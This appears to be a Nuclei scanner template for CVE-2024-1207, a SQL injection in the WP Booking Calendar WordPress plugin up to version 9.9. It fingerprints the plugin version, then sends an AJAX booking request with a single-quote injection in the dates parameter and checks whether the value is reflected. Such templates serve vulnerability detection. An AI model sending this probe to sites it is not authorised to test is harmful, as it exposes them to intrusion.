id: CVE-2024-1207
info:
  name: WP Booking Calendar SQL Injection Vulnerability
  author: CyberXTron Technologies
  severity: high
  description: The WP Booking Calendar plugin for WordPress is vulnerable to SQL Injection due to insufficient escaping on user-supplied parameter and lack of preparation in the existing SQL query. This affects versions up to and including 9.9.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/7802ed1f-138c-4a3d-916c-80fb4f7699b2?source=cve
    - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3032596%40booking&new=3032596%40booking&sfp_email=&sfph_mail=

http:
  - method: GET
    path:
      - '{{BaseURL}}'
    matchers:
      - type: regex
        part: body
        regex:
          - (\/plugins\/booking\/js\/wpbc_vars\.js\?ver=)(9\.9\"|9\.[0-8]|[0-8]\.[0-9])
    extractors:
      - type: regex
        part: body
        regex:
          - (\/plugins\/booking\/js\/wpbc_vars\.js\?ver=)(9\.9\"|9\.[0-8]|[0-8]\.[0-9])
        group: 2  
        name: version

  - raw:
      - |-
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Content-Length: 679
        Origin: http://127.0.0.1:8000
        Connection: close
        Referer: http://127.0.0.1:8000/?page_id=6
        Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin

        action=WPBC_AJX_BOOKING__CREATE&wpbc_ajx_user_id=0&nonce=1f59f79357&wpbc_ajx_locale=en_US&calendar_request_params%5Bresource_id%5D=1&calendar_request_params%5Bdates_ddmmyy_csv%5D=17.04.2100'&calendar_request_params%5Bformdata%5D=select-one%5Erangetime1%5E09%3A00+-+10%3A00~text%5Ename1%5Etest%40test.com~text%5Esecondname1%5Etest%40test.com~email%5Eemail1%5Etest%40test.com~text%5Ephone1%5Etest%40test.com~textarea%5Edetails1%5Etest%40test.com&calendar_request_params%5Bbooking_hash%5D=&calendar_request_params%5Bcustom_form%5D=&calendar_request_params%5Baggregate_resource_id_arr%5D=&calendar_request_params%5Bis_emails_send%5D=1&calendar_request_params%5Bactive_locale%5D=en_US

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"dates_ddmmyy_csv":"17.04.2100''"'
      - type: status
        status:
          - 200
